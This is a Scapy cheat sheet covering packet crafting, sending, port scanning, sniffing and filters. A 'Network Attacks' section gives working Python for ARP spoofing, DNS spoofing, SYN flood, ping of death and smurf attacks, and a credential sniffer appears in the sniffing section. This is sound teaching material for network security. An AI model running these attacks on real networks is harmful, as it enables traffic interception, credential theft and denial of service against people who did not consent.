# Scapy Cheat Sheet

## Installation & Running Scapy

```bash
# Install Scapy
pip install scapy

# Run Scapy (requires root/sudo)
sudo scapy

# Or in Python script
from scapy.all import *
```

---

## Packet Architecture

### Layer Structure
Packets in Scapy are built using layers stacked with the `/` operator:

```python
# Basic structure: Layer1 / Layer2 / Layer3 / Data
packet = Ethernet() / IP() / TCP() / "Hello World"
```

### Creating Basic Packets

```python
# IP packet
ip_packet = IP(dst="192.168.1.1")

# Ethernet frame
eth_frame = Ether(dst="ff:ff:ff:ff:ff:ff")

# Complete packet with data
packet = IP(dst="8.8.8.8") / ICMP() / "Ping data"

# TCP packet
tcp_packet = IP(dst="192.168.1.100") / TCP(dport=80, flags="S")

# UDP packet
udp_packet = IP(dst="192.168.1.100") / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname="google.com"))
```

### Setting Packet Fields

```python
# Set specific fields
ip = IP(src="10.0.0.1", dst="10.0.0.2", ttl=64)

# TCP with specific flags
tcp = TCP(sport=1234, dport=80, flags="S", seq=1000)

# Multiple fields
packet = IP(src="192.168.1.5", dst="192.168.1.1", ttl=128) / \
         TCP(sport=5000, dport=443, flags="PA") / \
         "GET / HTTP/1.1\r\nHost: example.com\r\n\r\n"
```

---

## Viewing Packets

### Display Packet Information

```python
# Show packet summary
packet.show()

# Display packet details
packet.show2()

# List all layers
packet.layers()

# Get specific layer
packet[TCP]

# Show in hexdump format
hexdump(packet)

# Summary string
print(packet.summary())

# List available fields
ls(IP)
ls(TCP)

# Convert to bytes
bytes(packet)

# Pretty print
packet.display()
```

### Example Output

```python
>>> packet = IP(dst="8.8.8.8")/ICMP()/"Hello"
>>> packet.show()
###[ IP ]### 
  version   = 4
  ihl       = None
  tos       = 0x0
  len       = None
  id        = 1
  flags     = 
  frag      = 0
  ttl       = 64
  proto     = icmp
  chksum    = None
  src       = 192.168.1.10
  dst       = 8.8.8.8
###[ ICMP ]### 
     type      = echo-request
     code      = 0
     chksum    = None
     id        = 0x0
     seq       = 0x0
###[ Raw ]### 
        load      = 'Hello'
```

---

## Sending Packets

### Basic Sending Commands

```python
# Send at Layer 3 (IP) - no response expected
send(IP(dst="192.168.1.1")/ICMP())

# Send at Layer 2 (Ethernet) - no response expected
sendp(Ether()/IP(dst="192.168.1.1")/ICMP())

# Send and receive one response (Layer 3)
ans, unans = sr(IP(dst="8.8.8.8")/ICMP())

# Send and receive one response (Layer 2)
ans, unans = srp(Ether()/IP(dst="192.168.1.1")/ICMP())

# Send and receive only first response
response = sr1(IP(dst="8.8.8.8")/ICMP())

# Send with loop
sendpfast(IP(dst="192.168.1.1")/ICMP(), loop=1000)
```

### Send and Receive with Analysis

```python
# ICMP Ping
packet = IP(dst="8.8.8.8")/ICMP()
response = sr1(packet, timeout=2)

if response:
    print(f"Received response from {response[IP].src}")
    response.show()
else:
    print("No response received")

# Multiple packets
packets = IP(dst="192.168.1.1-10")/ICMP()
ans, unans = sr(packets, timeout=2)

# Analyze responses
for sent, received in ans:
    print(f"{sent[IP].dst} is alive")

# View unanswered packets
print(f"No response from {len(unans)} hosts")
```

### Advanced Sending Options

```python
# Send with specific interface
send(packet, iface="eth0")

# Send multiple times
send(packet, count=5)

# Send with delay
send(packet, inter=1)  # 1 second between packets

# Verbose output
send(packet, verbose=True)

# Send loop
sendp(packet, iface="eth0", loop=1, inter=0.1)
```

---

## TCP Operations

### TCP Three-Way Handshake

```python
# Step 1: SYN
ip = IP(dst="192.168.1.100")
syn = TCP(sport=1024, dport=80, flags="S", seq=1000)
syn_ack = sr1(ip/syn)

if syn_ack:
    # Step 2: ACK (received SYN-ACK)
    ack = TCP(sport=1024, dport=80, flags="A", 
              seq=syn_ack.ack, ack=syn_ack.seq + 1)
    send(ip/ack)
    print("Connection established")
```

### Complete TCP Handshake Example

```python
# Target
target_ip = "192.168.1.100"
target_port = 80

# SYN
print("[*] Sending SYN...")
ip = IP(dst=target_ip)
syn = TCP(sport=RandShort(), dport=target_port, flags="S", seq=1000)
syn_ack = sr1(ip/syn, timeout=2)

if syn_ack and syn_ack.haslayer(TCP):
    if syn_ack[TCP].flags == "SA":  # SYN-ACK
        print("[*] Received SYN-ACK")
        
        # ACK
        ack = TCP(sport=syn.sport, dport=target_port, 
                  flags="A", seq=syn_ack.ack, ack=syn_ack.seq + 1)
        send(ip/ack)
        print("[*] Connection established!")
        
        # Send data (PSH-ACK)
        data = "GET / HTTP/1.1\r\nHost: example.com\r\n\r\n"
        push = TCP(sport=syn.sport, dport=target_port,
                   flags="PA", seq=syn_ack.ack, ack=syn_ack.seq + 1)
        send(ip/push/data)
        print("[*] Data sent")
        
        # Close connection (FIN)
        fin = TCP(sport=syn.sport, dport=target_port,
                  flags="FA", seq=syn_ack.ack+len(data), ack=syn_ack.seq + 1)
        send(ip/fin)
        print("[*] Connection closed")
```

### TCP Port Scanning

```python
# SYN Scan (Stealth scan)
def syn_scan(target, ports):
    for port in ports:
        packet = IP(dst=target)/TCP(dport=port, flags="S")
        response = sr1(packet, timeout=1, verbose=0)
        
        if response and response.haslayer(TCP):
            if response[TCP].flags == "SA":  # SYN-ACK
                print(f"Port {port}: OPEN")
                # Send RST to close connection
                rst = IP(dst=target)/TCP(dport=port, flags="R")
                send(rst, verbose=0)
            elif response[TCP].flags == "RA":  # RST-ACK
                print(f"Port {port}: CLOSED")
        else:
            print(f"Port {port}: FILTERED")

# Usage
syn_scan("192.168.1.100", [22, 80, 443, 8080])
```

### Regular TCP Packet

```python
# Simple TCP packet
packet = IP(dst="192.168.1.100")/TCP(dport=80, flags="S")
response = sr1(packet)

# TCP with data
packet = IP(dst="192.168.1.100")/TCP(dport=80, flags="PA")/"Hello Server"
send(packet)

# Check TCP flags
if response and response.haslayer(TCP):
    flags = response[TCP].flags
    if flags & 0x02:  # SYN
        print("SYN flag set")
    if flags & 0x10:  # ACK
        print("ACK flag set")
```

---

## UDP Operations

### Basic UDP Packet

```python
# Simple UDP packet
packet = IP(dst="192.168.1.100")/UDP(dport=53)/"test data"
send(packet)

# UDP with response
response = sr1(IP(dst="8.8.8.8")/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="google.com")))
if response:
    response.show()
```

### UDP Port Scanning

```python
def udp_scan(target, ports):
    for port in ports:
        packet = IP(dst=target)/UDP(dport=port)
        response = sr1(packet, timeout=2, verbose=0)
        
        if response is None:
            print(f"Port {port}: OPEN|FILTERED")
        elif response.haslayer(ICMP):
            if response[ICMP].type == 3 and response[ICMP].code == 3:
                print(f"Port {port}: CLOSED")
            else:
                print(f"Port {port}: FILTERED")
        else:
            print(f"Port {port}: OPEN")

# Usage
udp_scan("192.168.1.100", [53, 67, 68, 161])
```

### DNS Query Example

```python
# DNS query using UDP
dns_query = IP(dst="8.8.8.8")/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="example.com"))
dns_response = sr1(dns_query, timeout=2)

if dns_response and dns_response.haslayer(DNS):
    print("DNS Response:")
    for i in range(dns_response[DNS].ancount):
        print(f"  {dns_response[DNS].an[i].rdata}")
```

---

## Network Attacks

### 1. ARP Spoofing (Man-in-the-Middle)

#### Prerequisites Setup

```bash
# Enable promiscuous mode
sudo ip link set eth0 promisc on

# Add IP address to interface
sudo ip addr add 10.0.0.3/24 dev eth0

# Enable IP forwarding (to avoid DoS)
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# Verify
ip addr show eth0
cat /proc/sys/net/ipv4/ip_forward
```

#### ARP Spoofing Attack

```python
# sendp(Ether(src="<attacker_mac>", dst="ff:ff:ff:ff:ff:ff") / ARP(op="is-at", psrc="<victim_ip>", hwsrc="<attacker_mac>"), iface="eth0")
from scapy.all import *
import time

# Target configuration
target_ip = "10.0.0.5"      # Victim IP
gateway_ip = "10.0.0.1"     # Router/Gateway IP
attacker_mac = "aa:bb:cc:dd:ee:ff"  # Your MAC address
iface = "eth0"

# Get target MAC
def get_mac(ip):
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), 
                     timeout=2, verbose=0)
    if ans:
        return ans[0][1].hwsrc
    return None

target_mac = get_mac(target_ip)
gateway_mac = get_mac(gateway_ip)

print(f"[*] Target MAC: {target_mac}")
print(f"[*] Gateway MAC: {gateway_mac}")

# ARP spoofing function
def arp_spoof(target_ip, target_mac, gateway_ip):
    # Tell target that we are the gateway
    arp_response = ARP(op=2,  # is-at (response)
                       pdst=target_ip,
                       hwdst=target_mac,
                       psrc=gateway_ip,
                       hwsrc=attacker_mac)
    send(arp_response, verbose=0)

def restore_arp(target_ip, target_mac, gateway_ip, gateway_mac):
    # Restore correct ARP tables
    arp_response = ARP(op=2,
                       pdst=target_ip,
                       hwdst=target_mac,
                       psrc=gateway_ip,
                       hwsrc=gateway_mac)
    send(arp_response, count=5, verbose=0)

# Attack loop
try:
    print("[*] Starting ARP spoofing... Press Ctrl+C to stop")
    while True:
        # Poison target's ARP cache
        arp_spoof(target_ip, target_mac, gateway_ip)
        # Poison gateway's ARP cache
        arp_spoof(gateway_ip, gateway_mac, target_ip)
        time.sleep(2)
        
except KeyboardInterrupt:
    print("\n[*] Restoring ARP tables...")
    restore_arp(target_ip, target_mac, gateway_ip, gateway_mac)
    restore_arp(gateway_ip, gateway_mac, target_ip, target_mac)
    print("[*] ARP tables restored")
```

#### ARP Cache Poisoning (Broadcast)

```python
# Send gratuitous ARP
def arp_poison_broadcast(target_ip, attacker_mac):
    arp = ARP(op=2,  # is-at
              pdst=target_ip,
              hwdst="ff:ff:ff:ff:ff:ff",
              psrc=target_ip,
              hwsrc=attacker_mac)
    sendp(Ether(dst="ff:ff:ff:ff:ff:ff")/arp, iface="eth0")
    print(f"[*] Sent gratuitous ARP for {target_ip}")

# Poison entire network
arp_poison_broadcast("10.0.0.1", "aa:bb:cc:dd:ee:ff")
```

### 2. SYN Flood Attack

```python
def syn_flood(target_ip, target_port, count=1000):
    print(f"[*] Starting SYN flood on {target_ip}:{target_port}")
    
    for i in range(count):
        # Random source IP and port
        src_ip = ".".join(map(str, (random.randint(1,254) for _ in range(4))))
        src_port = random.randint(1024, 65535)
        
        # Create SYN packet
        packet = IP(src=src_ip, dst=target_ip) / \
                 TCP(sport=src_port, dport=target_port, flags="S")
        
        send(packet, verbose=0)
        
        if i % 100 == 0:
            print(f"[*] Sent {i} packets")
    
    print(f"[*] Attack complete: {count} packets sent")

# Usage (for testing only!)
# syn_flood("192.168.1.100", 80, 500)
```

### 3. DNS Spoofing

```python
def dns_spoof(pkt):
    if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:  # DNS query
        # Create fake DNS response
        spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                      UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                      DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                          an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, 
                                   rdata="10.0.0.3"))  # Fake IP
        send(spoofed_pkt, verbose=0)
        print(f"[*] Spoofed DNS response for {pkt[DNS].qd.qname.decode()}")

# Sniff and spoof DNS
print("[*] Starting DNS spoofing...")
sniff(filter="udp port 53", prn=dns_spoof, iface="eth0")
```

### 4. Ping of Death

```python
# Send oversized ICMP packet
def ping_of_death(target):
    # Create large payload (> 65535 bytes when fragmented)
    packet = IP(dst=target)/ICMP()/("X"*60000)
    send(fragment(packet), verbose=0)
    print(f"[*] Sent fragmented oversized ICMP to {target}")

# ping_of_death("192.168.1.100")
```

### 5. Smurf Attack (ICMP Amplification)

```python
def smurf_attack(target_ip, broadcast_ip):
    # Send ICMP with spoofed source to broadcast
    packet = IP(src=target_ip, dst=broadcast_ip)/ICMP()
    send(packet, count=100, verbose=0)
    print(f"[*] Smurf attack: {target_ip} <- {broadcast_ip}")

# smurf_attack("192.168.1.100", "192.168.1.255")
```

---

## Packet Sniffing

### Basic Sniffing

```python
# Sniff 10 packets
packets = sniff(count=10)

# Sniff on specific interface
packets = sniff(iface="eth0", count=10)

# Sniff with filter (BPF syntax)
packets = sniff(filter="tcp port 80", count=10)

# Sniff with callback function
def packet_callback(packet):
    print(packet.summary())

sniff(prn=packet_callback, count=10)

# Sniff indefinitely (Ctrl+C to stop)
sniff(prn=lambda x: x.summary())
```

### Advanced Sniffing Examples

```python
# Capture HTTP traffic
def http_sniffer(packet):
    if packet.haslayer(TCP) and packet.haslayer(Raw):
        load = packet[Raw].load.decode('utf-8', errors='ignore')
        if "GET" in load or "POST" in load:
            print(f"\n[HTTP Request]")
            print(load)

sniff(filter="tcp port 80", prn=http_sniffer)

# Capture credentials
def credential_sniffer(packet):
    if packet.haslayer(TCP) and packet.haslayer(Raw):
        load = str(packet[Raw].load)
        keywords = ["user", "pass", "login", "password"]
        if any(keyword in load.lower() for keyword in keywords):
            print(f"\n[*] Possible credentials found:")
            print(f"From: {packet[IP].src}:{packet[TCP].sport}")
            print(f"To: {packet[IP].dst}:{packet[TCP].dport}")
            print(load)

sniff(filter="tcp", prn=credential_sniffer)
```

---

## Useful Filters

```python
# BPF (Berkeley Packet Filter) syntax examples

# Specific protocol
sniff(filter="tcp")
sniff(filter="udp")
sniff(filter="icmp")

# Specific port
sniff(filter="port 80")
sniff(filter="tcp port 443")
sniff(filter="udp port 53")

# Specific host
sniff(filter="host 192.168.1.1")
sniff(filter="src host 192.168.1.1")
sniff(filter="dst host 192.168.1.1")

# Network
sniff(filter="net 192.168.1.0/24")

# Combinations
sniff(filter="tcp and port 80")
sniff(filter="host 192.168.1.1 and tcp port 443")
sniff(filter="tcp and not port 22")
sniff(filter="(tcp port 80 or tcp port 443) and host 192.168.1.1")
```

---

## Saving and Loading Packets

```python
# Capture and save to file
packets = sniff(count=100)
wrpcap("capture.pcap", packets)

# Load from file
packets = rdpcap("capture.pcap")

# Process loaded packets
for packet in packets:
    if packet.haslayer(IP):
        print(f"{packet[IP].src} -> {packet[IP].dst}")
```

---

## Useful Utility Functions

```python
# Display available interfaces
conf.iface

# List all interfaces
get_if_list()

# Get interface IP
get_if_addr("eth0")

# Generate random MAC
RandMAC()

# Generate random IP
RandIP()

# Packet statistics
packets.nsummary()
packets.conversations()

# Traceroute
ans, unans = traceroute("google.com")

# TCP traceroute
ans, unans = traceroute("google.com", l4=TCP())
```
